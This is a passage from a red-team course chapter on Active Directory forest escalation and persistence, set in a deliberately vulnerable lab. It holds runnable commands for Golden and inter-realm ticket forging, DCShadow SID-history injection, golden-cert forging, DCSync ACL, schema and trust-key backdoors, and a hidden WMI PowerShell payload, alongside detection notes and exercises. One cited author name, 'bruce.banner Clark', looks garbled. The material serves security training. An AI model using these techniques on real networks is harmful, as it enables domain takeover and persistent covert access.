A subtler variant — DA in corp.local lets you DCSync against root.corp because the parent-child trust gives `Authenticated Users` from corp delegated read on root.corp's RootDSE replication metadata if (and only if) the parent–child trust has been set up *without* the standard hardening. DVAD leaves this open.

```bash
impacket-secretsdump 'corp.local/Administrator:'...'@dc01.root.corp -just-dc-user root.corp/krbtgt
```

If this works, you now have `krbtgt@root.corp` — full Golden capability on the root domain → Enterprise Admins forest-wide.

[Flag: DF-001]

---

## 12.16 Child → Sibling (DF-002): eu.corp.local

`eu.corp.local` is a sibling child of `corp.local` under the same root `root.corp`. You don't need to go up-then-down — you can attack the sibling directly via Kerberoasting and ACL paths over the transitive trust chain.

```
       root.corp
        /      \
   corp.local   eu.corp.local
```

Within a forest:
- The schema and configuration NCs are shared.
- Enterprise Admins is admin everywhere.
- Authenticated Users from one child can read most of another child's directory.

### Path A — pivot through root.corp

1. DF-001 to get EA on root.corp.
2. As EA, log into dc01.eu.corp.local directly:

```bash
impacket-psexec root.corp/Administrator:'...'@dc01.eu.corp.local
```

### Path B — direct cross-child SID-history TGT

Forge a Golden in corp.local with ExtraSids = `eu.corp.local Domain Admins` (RID 512 with that domain's SID), then request a TGS for `cifs/dc01.eu.corp.local` via referral:

```bash
impacket-ticketer \
    -nthash <corp_krbtgt> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-EU-512 \
    Administrator

export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn 'cifs/dc01.eu.corp.local' -dc-ip 10.10.0.11 corp.local/Administrator
impacket-psexec -k -no-pass dc01.eu.corp.local
```

### Path C — RBCD across child trust

Find a computer in eu.corp.local with `msDS-AllowedToActOnBehalfOfOtherIdentity` writable from corp (forest-trust ACLs often permit this for legacy migration scenarios). Configure RBCD, then S4U2Self/S4U2Proxy for Administrator.

[Flag: DF-002]

---

## 12.17 Forest persistence via ADCS (DF-009)

If `root.corp` and `corp.local` share a CA (or each forest has its own CA whose root cert is in the others' `NTAuthCertificates`), and you compromised the CA, you can issue a cert for *any* user in any forest that trusts that CA.

```bash
# As DA on corp.local with the CA private key (golden cert):
certipy ca -ca CORP-CA -u Administrator -hashes :<NT> -dc-ip 10.10.0.10 \
    -backup
# → exports the CA's private key + cert

# Forge an "EnterpriseAdministrator" cert for root.corp:
certipy forge -ca-pfx ca.pfx -upn 'Administrator@root.corp' \
    -subject 'CN=Administrator,CN=Users,DC=root,DC=corp'
# → administrator.pfx valid against root.corp because NTAuthCertificates trusts the CA

certipy auth -pfx administrator.pfx -dc-ip 10.30.0.10
```

This is **the most powerful forest-wide persistence** because:
- Survives krbtgt rotation in all domains.
- Survives password resets.
- Cert lifetime is whatever you set when forging (you control the CA key).
- Defender must rotate the CA cert AND the `NTAuthCertificates` store AND revoke every issued cert. Most orgs cannot do this without a multi-month project.

### "Golden cert" vs ESC1

| Aspect | Golden cert (post-CA-compromise) | ESC1 cert (template abuse) |
|---|---|---|
| Requires | CA private key | A vulnerable template |
| Revocable? | Yes if CA still functional | Yes |
| Lifetime | Attacker-controlled (decades) | Template-controlled |
| Detection | None on issue (no CA involvement) | 4886/4887 on CA |

[Flag: DF-009]

---

## 12.18 Schema-level persistence (DF-013)

If you become **Schema Admin**, you can modify the AD schema itself. The schema replicates to every DC in every domain of the forest — and schema changes are **irreversible** in practice (Microsoft documents that schema attributes cannot be removed once created).

### Idea — install a backdoor attribute

```
PS> $sch = [ADSI]'LDAP://CN=Schema,CN=Configuration,DC=root,DC=corp'
PS> # Create a new attribute "userBackup" on User class
PS> # Default ACL: grant peter.parker ReadProperty on it
PS> # Use the attribute to store an encrypted password or key cred
```

Now `peter.parker` has a *schema-level* place to stash a key that survives any DACL audit because schema ACLs are seldom audited.

### Idea — modify the default security descriptor of a class

The default SD of the `user` class controls the DACL applied to every *new* user object. Adding peter.parker as GenericAll to that SD means every user created from this point forward has peter.parker as GenericAll.

```
PS> Set-ADObject -Identity 'CN=User,CN=Schema,CN=Configuration,DC=root,DC=corp' \
        -Replace @{defaultSecurityDescriptor='<modified SDDL>'}
```

This is *the* canonical "I will never be removed" backdoor — it self-propagates onto every new account.

### Defense

- Audit changes to the schema NC. 5136 on any object with parent CN=Schema is high-fidelity.
- Schema Admins should be empty by default; population is the alarm.

[Flag: DF-013]

---

## 12.19 Security descriptor backdoor on Domain root (DF-014)

The domain object (`DC=corp,DC=local`) has an `nTSecurityDescriptor` controlling who can do directory-wide things including DCSync. Add an ACE granting peter.parker **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All**:

```bash
impacket-dacledit -action 'write' \
    -rights 'DCSync' \
    -principal peter.parker \
    -target-dn 'DC=corp,DC=local' \
    'corp.local/Administrator@10.10.0.10' -hashes :<NT>
```

Now peter.parker can DCSync the domain forever — no group membership, no exposed credential. The ACE survives password resets, AdminSDHolder runs (it doesn't touch the domain object's SD), and most audits because few orgs baseline the domain root SD.

A defender's only signal is 5136 on `DC=corp,DC=local` for an `nTSecurityDescriptor` change — very low volume, so easy to alert on if you remember to set it up.

[Flag: DF-014]

---

## 12.20 sIDHistory injection via forest trust (DF-016)

DCShadow into a corp.local user with `sIDHistory=S-1-5-21-FINANCE-519`. When that user authenticates against finance, the PAC carries the EA SID, and the finance DC honors it (subject to SID filtering).

DVAD intentionally clears `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` on the corp↔finance forest trust, which disables SID filtering.

```bash
# Set SID history:
mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
    /attribute:sIDHistory /value:S-1-5-21-FINANCE-519
mimikatz # lsadump::dcshadow /push

# Now log into finance via Kerberos cross-realm:
impacket-getTGT corp.local/peter.parker:'...'@dc01.corp.local
impacket-getST -spn 'cifs/dc01.finance.local' -dc-ip 10.20.0.10 -k corp.local/peter.parker
impacket-psexec -k -no-pass dc01.finance.local
```

[Flag: DF-016]

---

## 12.21 Foreign group membership (DF-017)

A user in corp.local can be added to a group in finance.local if there's a foreign-security-principal (FSP) entry. The FSP is a stub object in `CN=ForeignSecurityPrincipals,DC=finance,DC=local` with name = the corp user's SID. Add that FSP to a privileged group in finance:

```bash
# As DA in corp, add peter.parker's SID as FSP into finance EA via cross-realm LDAP:
ldapmodify -H ldaps://dc01.finance.local -D "corp\\Administrator" -w '...' <<EOF
dn: CN=Enterprise Admins,CN=Users,DC=finance,DC=local
changetype: modify
add: member
member: CN=S-1-5-21-CORP-1105,CN=ForeignSecurityPrincipals,DC=finance,DC=local
EOF
```

This works only if the corp DA has write access to the finance EA group, which it doesn't by default — but a *misconfigured* admin migration scenario sometimes leaves this open. In DVAD it's deliberately enabled for the lab.

[Flag: DF-017]

---

## 12.22 Trust account password backdoor (DF-022)

The trust account (e.g., `FINANCE$` on the corp side) has a password that AD rotates automatically every 30 days. If you set its password manually and disable the rotation, defenders cannot rotate it out from under you without breaking the trust entirely.

```
PS> Set-ADAccountPassword -Identity 'FINANCE$' -NewPassword (ConvertTo-SecureString 'AttackerPicked!' -AsPlainText -Force)
PS> Set-ADAccountControl -Identity 'FINANCE$' -PasswordNeverExpires $true
```

You now have a known trust key for as long as the trust exists. Combine with §12.14 to mint inter-realm TGTs at will.

[Flag: DF-022]

---

## 12.23 Local persistence techniques (PER-031..037)

Quick catalog for completeness — these are host-local, lowest-rung, but useful as the bottom layer of the stack.

| Technique | Mechanism | Survives reboot? | Detection signal |
|---|---|---|---|
| Service install | `sc.exe create EvilSvc binPath= "...\bad.exe" start= auto` | Yes | 7045, 4697 |
| Scheduled task | `schtasks /create /tn Updater /tr <path> /sc onlogon /ru SYSTEM` | Yes | 4698 |
| Run key | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` or `HKCU\...\Run` | Yes (on logon) | reg write to that key |
| RunOnce key | `HKLM\...\RunOnce` | Once next boot, then deleted | reg write |
| WMI event subscription | `__EventFilter` + `CommandLineEventConsumer` + binding | Yes | WMI-Activity Operational EID 5861 |
| Image File Execution Options | Debugger value for sethc.exe → SYSTEM shell at logon screen | Yes | reg write to IFEO |
| Accessibility hijack | Replace `sethc.exe`/`osk.exe`/`Utilman.exe` with `cmd.exe` | Yes | file write in System32 |
| DSRM logon | `DsrmAdminLogonBehavior=2` + reuse DSRM password as local admin on DC | Yes | reg write |
| Sticky service DLL | DLL load-order hijack of a SYSTEM service | Yes | file write near service |
| COM hijack | `HKCU\Software\Classes\CLSID\{...}\InProcServer32` → attacker DLL | Yes (per user) | reg write |
| Startup folder shortcut | `.lnk` in `%APPDATA%\...\Startup\` | Yes (on logon) | file create |
| Logon script via UserInit | `HKLM\...\Winlogon\Userinit` value | Yes | reg write |
| App init DLLs | `HKLM\...\Windows\AppInit_DLLs` | Yes (loaded into user32-using procs) | reg write |
| Print processor | `HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\...\Print Processors` | Yes | reg + file write |
| Netsh helper DLL | `netsh add helper` | Yes | reg write |
| LSA Authentication Package | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages` | Yes (loaded by LSASS) | reg write |
| LSA Notification Package | `HKLM\...\Lsa\Notification Packages` (password change DLL) | Yes | reg write |

[Flags: PER-031..037]

### WMI subscription example (PER-035)

```powershell
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    Name='PersistFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL';
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
    Name='PersistConsumer'; CommandLineTemplate='powershell.exe -nop -w hidden -enc <base64>'
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter=$Filter; Consumer=$Consumer
}
```

Now your payload fires every 60 seconds via WMI. Survives reboot. Detectable via WMI-Activity Operational event 5861, but few orgs log it.

---

## 12.24 (Concept) Forest = security boundary, not domain

A common misconception: "Domain Admin in one domain ≠ admin in another domain of the same forest." True at the access-control level, **false at the trust-anchor level**:

- Every DC in the forest replicates the **Configuration NC** and **Schema NC**.
- The **Enterprise Admins** group lives in the forest root and is granted admin on every domain in the forest by default.
- A DA in a child domain can DCShadow / forge SID history to claim Enterprise Admins membership.
- Schema Admins can modify the schema, which replicates everywhere.

**Forest is the actual security boundary.** Microsoft documents this explicitly in *Security Considerations for Active Directory Domains and Trusts*.

External trusts (`corp ↔ finance`, distinct forests) have SID filtering by default, so they *are* a security boundary — **unless filtering is disabled** (which DVAD does, on purpose, for the lab).

### What does this mean operationally

If a customer has "two domains in one forest, with admin separation between them," tell them they don't. A red-team brief that ends "we got DA of CHILD1 but the customer said the prize was DA of CHILD2" should explain DF-001 / DF-002 and quote the Microsoft documentation.

---

## 12.25 (Concept) Building a persistence stack

A real engagement plants 5–10 backdoors at different rungs. Example stack for a 6-month tenure on corp.local:

| Rung | Backdoor | Why |
|---|---|---|
| Host (file01) | WMI subscription firing every 30 min | Beacon revival if other paths burn |
| Host (dc01) | Scheduled task running `nltest /dsgetdc:` | Looks operationally normal |
| Object | Shadow cred on `Administrator` | PKINIT recovery, survives ACL audit |
| Object | RBCD on `dc01$` from a controlled computer | Lets you S4U2Self from a low-priv user |
| Domain | Two stashed AdminPFXs from ESC1 (different templates) | Two cert lifetimes, two templates to audit |
| Domain | AdminSDHolder ACE for an obscure user | Easy DA recovery |
| Domain | krbtgt hash + skeleton key on PDC | Golden + skeleton fallback |
| Forest | Trust key for finance + root.corp | Cross-forest fallback |
| Forest | Forged "Golden cert" from corp-ca | Cross-forest survival of trust changes |
| Forest | Schema attribute backdoor | Truly permanent |

A defender finding any *one* of these prompts a sweep. A defender finding *all ten* is rare — and even then, the schema attribute backdoor is essentially uninstallable.

The lesson for defenders: **don't stop investigating after finding the first artifact**. The first thing you find is usually decoy or the easiest-to-spot — keep going.

---

## 12.26 Cross-forest reconnaissance

Before attacking a trust, enumerate it carefully.

### Trust object inventory

```bash
# From corp DA, list every trust:
impacket-getArch -target dc01.corp.local
ldapsearch -H ldap://10.10.0.10 -D 'CORP\Administrator' -w '...' \
    -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
    name trustType trustDirection trustAttributes flatName
```

`trustAttributes` bitmask (relevant bits):
- `0x1 NON_TRANSITIVE` — doesn't follow chain
- `0x4 QUARANTINED_DOMAIN` — SID filter ON (good for defender; DVAD removes it)
- `0x8 FOREST_TRANSITIVE` — forest trust
- `0x20 CROSS_ORGANIZATION` — Selective Auth
- `0x40 WITHIN_FOREST` — intra-forest (child or tree-root)

### Powershell native

```
PS> Get-ADTrust -Filter *
```

### Sensitive attributes to check

- `trustAuthOutgoing` / `trustAuthIncoming` — the trust keys (DCSync to get them).
- `msDS-TrustForestTrustInfo` — the forest-trust topology blob; tells you sub-domains across the trust.
- `securityIdentifier` — the SID of the *other* domain, needed for ExtraSid forging.

---

## 12.27 finance.local pivot (DF-007)

The corp ↔ finance external/forest trust. Direction in DVAD: bidirectional. SID filtering: disabled. So everything in §12.14 and §12.20 works.

End-to-end pivot:

```bash
# 1. From corp DA, dump trust key:
impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc | grep -i finance

# 2. Forge inter-realm TGT with EA-of-finance ExtraSid:
impacket-ticketer -nthash <FINANCE_TRUST_NT> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-FINANCE-519 \
    -spn 'krbtgt/FINANCE.LOCAL' \
    Administrator

# 3. Use to request a TGS in finance:
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass \
    -spn 'cifs/dc01.finance.local' \
    -dc-ip 10.20.0.10 \
    corp.local/Administrator

# 4. Lateral with the TGS:
impacket-psexec -k -no-pass dc01.finance.local
type C:\Flags\DF-007.txt
```

[Flag: DF-007]

---

## 12.28 root.corp pivot (DF-001 / DF-008)

```bash
# 1. DCSync corp krbtgt:
impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc-user 'krbtgt'

# 2. Get root.corp's SID:
impacket-lookupsid corp.local/Administrator:'...'@10.30.0.10 0 | grep -i 'Domain SID'

# 3. Forge Golden with ExtraSid = root EA:
impacket-ticketer -nthash <corp_krbtgt_NT> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-ROOT-519 \
    Administrator

# 4. Request TGS for root DC:
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass \
    -spn 'cifs/dc01.root.corp' \
    -dc-ip 10.30.0.10 \
    corp.local/Administrator

# 5. Auth:
impacket-psexec -k -no-pass dc01.root.corp
```

You are now EA on root.corp → admin on every domain in the forest (corp, eu, anything else).

[Flag: DF-001 / DF-008]

---

## 12.29 eu.corp.local pivot (DF-002 / DF-010)

After DF-001, simplest route: log in as root EA.

Direct route without going via root:

```bash
# 1. Forge in corp with ExtraSid = eu DA (RID 512 of eu.corp.local SID):
impacket-lookupsid corp.local/Administrator:'...'@10.10.0.11 0  # get eu SID
impacket-ticketer -nthash <corp_krbtgt> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-EU-512 \
    Administrator

export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn 'cifs/dc01.eu.corp.local' -dc-ip 10.10.0.11 corp.local/Administrator
impacket-psexec -k -no-pass dc01.eu.corp.local
```

[Flag: DF-002 / DF-010]

---

## 12.30 (Concept) Putting it all together — the forest end-state

After working through PLAN.md and §§12.27–12.29, you hold:

- DA on `corp.local`
- EA on `root.corp` (via SID history)
- DA on `eu.corp.local` (via SID history into eu)
- DA on `finance.local` (via forest-trust ticket forge with SID filter bypass)
- A backup PFX for Administrator in each domain
- Shadow cred on at least one DA in each domain
- Trust keys stashed for each trust
- AdminSDHolder ACE in corp
- A WMI subscription on file01

This is the "everything compromised" state PLAN.md describes. The remaining capstone (chapter 14) is about chaining and writing it up.

---

## 12.31 Variant attacks worth knowing

### 12.31.1 Schema modification for default user ACL (DF-013-b)

Modify the `defaultSecurityDescriptor` of `classSchema=user`. Every future user is born with your ACE.

### 12.31.2 Certificate template ACL backdoor (PER-019)

Add `Enrollee` rights for a low-priv user (`peter.parker`) on a sensitive cert template like `EnterpriseAdmin`. Re-enrollment gives EA.

### 12.31.3 Roastable backup of krbtgt

Set `krbtgt`'s `userAccountControl` bit `DONT_REQ_PREAUTH` (4194304). Now AS-REP roasting returns its hash without authentication. Re-run any time. (DVAD's krbtgt is normal — but this is a famous backdoor pattern.)

### 12.31.4 RID 519 group backdoor

Create a new group `Domain Users-Mgmt` with SID ending in -519 manually — wait, you can't pick the RID. But you can add `Authenticated Users` as a member of the *real* EA group via DCShadow. The next gpupdate gives every authenticated user EA. Rare in the wild — too loud — but real.

### 12.31.5 GPO link to high-priv OU

Even without editing the Default Domain Controllers Policy, you can `New-GPO` and link it to `OU=Domain Controllers,DC=corp,DC=local`. Your new GPO contains the malicious task; gpupdate applies it.

---

## 12.32 Token operations and "logon hijack" persistence

If you're SYSTEM on a host where a DA frequently logs in (jump server, RDS), you can:

1. Wait for the DA to log in (Get-LoggedOnUser).
2. Open their LSASS handle, steal their TGT (`mimikatz # sekurlsa::tickets /export`).
3. Pass-the-ticket from any of your hosts.

The TGT renews every 7 days by default; the renew chain lets you cycle indefinitely until the DA's *password* is reset (which invalidates the secret used to sign renewals).

This is a low-effort form of persistence with no AD writes — just opportunistic token theft from a high-traffic host.

---

## 12.33 The defender's view of this entire chapter

For each section above, the defender's options range from "patch the underlying issue" to "monitor and react." Highlights:

| Attack | Best detection | Best prevention |
|---|---|---|
| Golden ticket | 4769 with no preceding 4768; weird PAC fields | krbtgt double-reset after DA event |
| Silver ticket | absence of 4769; PAC validation (KB5020805) | rotate service account passwords; PAC validation enforce |
| Diamond/Sapphire ticket | DfI heuristics; PAC signature anomalies | same as Golden |
| AdminSDHolder | 5136 on AdminSDHolder DN | baseline + alert ACL audit |
| DCShadow | DfI; nTDSDSA object creation alert | minimize DA on workstations; PPL on lsass |
| Skeleton key | 4768 with anomalous etype + post-patch behavior | LSA Protection, Credential Guard, regular DC reboots |
| Cert persistence | 4886/4887 with SAN mismatch | StrongCertificateBindingEnforcement=2, short lifetimes |
| Shadow cred | enumerate msDS-KeyCredentialLink | audit baseline |
| GPO implant | 5136 on gPCFileSysPath; SYSVOL file writes | SYSVOL FIM |
| SID history | DfI; AD audit on sIDHistory | enable SID filtering on all trusts |
| Trust ticket forge | DfI inter-realm anomaly | rotate trust passwords; cannot fully prevent if DA compromised |
| Schema backdoor | 5136 on Schema NC | tightly control Schema Admins; empty by default |

Chapter 13 expands each of these into Sigma rules and KQL.

---

## Lab exercises

### Exercise 12.A — Golden ticket round-trip

1. DCSync krbtgt (CRED-007).
2. Forge Administrator TGT (PER-001).
3. `impacket-psexec` to dc01 — verify SYSTEM.
4. Reset krbtgt **once**. Re-try the ticket. Does it still work? (Yes — `key(n-1)` still valid.)
5. Wait > 10 hours, reset krbtgt again. Re-try. (Now it fails.)
6. From the failure event, identify the precise error you'd alert on as a defender.

### Exercise 12.B — Silver ticket without DC traffic

1. Get the NT hash of `sql01$` via DCSync.
2. Forge a Silver ticket for `MSSQLSvc/sql01.corp.local:1433`.
3. Run `tcpdump -i any -w silver.pcap host dc01.corp.local` on your attacker host during the auth — confirm zero traffic to dc01.
4. Compare to the same auth done with `getTGT + getST` — note the TGS-REQ that appears.

### Exercise 12.C — Diamond ticket vs Golden detection

1. Forge a Golden as Administrator. Use it. Capture 4768/4769 on the DC.
2. Forge a Diamond as Administrator from peter.parker's real TGT. Use it. Capture 4768/4769.
3. Compare the two event sequences. Which fields differ? Which fields are identical to a normal Administrator logon?

### Exercise 12.D — AdminSDHolder backdoor

1. Add a GenericAll ACE for `steve.rogers` on AdminSDHolder.
2. Confirm `dacledit --read --target-dn 'CN=Administrator,...'` doesn't yet show steve.rogers.
3. Force SDProp via `RunProtectAdminGroupsTask=1`.
4. Re-check — steve.rogers is now there.
5. Reset Administrator's password via `net rpc password`. Capture the krb5 / SMB exchange.

### Exercise 12.E — DCShadow attribute push

1. Make peter.parker EA via DCShadow `primaryGroupID=519`.
2. Confirm in LDAP that peter.parker's primary group is 519.
3. Find the matching event in the DC's directory service log — is there a 5136?
4. Now use the corresponding Defender for Identity / ATA detection signatures and explain why it would fire.

### Exercise 12.F — Skeleton key

1. Skeleton-key dc01 from a DA shell.
2. Confirm `impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local` works.
3. Try `corp.local/peter.parker:mimikatz@dc01.corp.local` — also works.
4. Reboot dc01. Re-try — fails.
5. Re-skeleton — works again.

### Exercise 12.G — Certificate persistence

1. Issue an `Administrator` PFX via ESC1.
2. Stash it.
3. Reset Administrator's password 3 times.
4. Auth with the PFX (`certipy auth -pfx ...`) — confirm fresh NT hash returns.

### Exercise 12.H — Shadow cred persistence

1. Plant a key cred on Administrator via certipy.
2. Confirm via `Get-ADUser administrator -Properties msDS-KeyCredentialLink`.
3. Run SDProp (RunProtectAdminGroupsTask).
4. Confirm the key cred *survives* SDProp (because it's an attribute, not a DACL).

### Exercise 12.I — GPO startup-script implant

1. SharpGPOAbuse `AddComputerScript` against Default Domain Controllers Policy with `net group "Domain Admins" peter.parker /add /domain`.
2. Run `gpupdate /force` on dc01 (you need shell on dc01 first).
3. Confirm peter.parker ∈ Domain Admins.
4. Find the SYSVOL file that holds the implant — identify the event you'd alert on.

### Exercise 12.J — Trust ticket to finance.local

1. Dump trust key with secretsdump.
2. Forge inter-realm TGT with `extra-sid` = finance EA.
3. Request TGS for `cifs/dc01.finance.local`.
4. Read `\\dc01.finance.local\C$\Flags\DF-005.txt`.

### Exercise 12.K — Child → Root via SID history

1. DCSync corp krbtgt.
2. Forge Golden with extra-sid = root EA.
3. Request TGS for `cifs/dc01.root.corp`.
4. Read flag on dc01.root.corp.

### Exercise 12.L — Persistence stack inventory

After completing 12.A–12.K, enumerate every persistence artefact you've planted in DVAD. Map each to a row in §12.25's stack table. Write the cleanup procedure for a defender.

---

## Self-check questions

1. Why are two krbtgt resets required, not one?
2. What's the difference between a Golden and a Diamond ticket on the wire?
3. What's the difference between a Diamond and a Sapphire ticket?
4. Why is DCShadow harder to detect than an LDAP modify?
5. Why does SID filtering exist, and which trust types apply it by default?
6. What's the difference between PER-013 (cert persistence) and PER-017 (shadow cred persistence)?
7. Why is the forest, not the domain, the security boundary?
8. What's the precondition for the trust ticket forge in DF-005?
9. What's the difference between a Silver ticket and a Diamond ticket in terms of "what credential the attacker needs"?
10. Why is skeleton key per-DC and not per-domain?
11. Why does AdminSDHolder run only on the PDC FSMO holder?
12. How long does an attacker have to forge Golden tickets after the *first* of two krbtgt resets?
13. What's the difference between `trustAuthOutgoing` and `trustAuthIncoming`?
14. Why is a schema attribute backdoor "permanent"?
15. What three signals on a DC event log would together indicate a DCShadow push?
16. If `QUARANTINED_DOMAIN` is set on a forest trust, what attacks does it block?
17. Why does a Silver ticket only work against one service?
18. What does PKINIT use as the "secret" if it's not a password?
19. Why is `New-PSDrive` a particularly stealthy lateral primitive?
20. How does a Sapphire ticket get "real" LastLogon timestamps?

---

## References

- **Sean Metcalf — *Sneaky AD Persistence Tricks*** — the canonical reference (adsecurity.org).
- **Benjamin Delpy — Mimikatz wiki, `lsadump::dcshadow`** notes.
- **Will Schroeder — *A Case Study in Wagging the Dog*** (S4U-derived persistence).
- **bruce.banner Clark — *Diamond Tickets*** (Semperis).
- **Pixis — *Sapphire Tickets*** (hackndo).
- **Microsoft — *Security Considerations for Trusts*** — Microsoft's own statement that forest = boundary.
- **Specter Ops — *Certified Pre-Owned*** (Schroeder, Christensen) — sections on ESC1 + cert persistence.
- **Microsoft — *Securing Active Directory*** — the official forest hardening guide.
- **KB5020805 — PAC validation hardening** — patch that affects Silver/Golden detectability.

Next: [13-defense-and-detection.md](13-defense-and-detection.md).
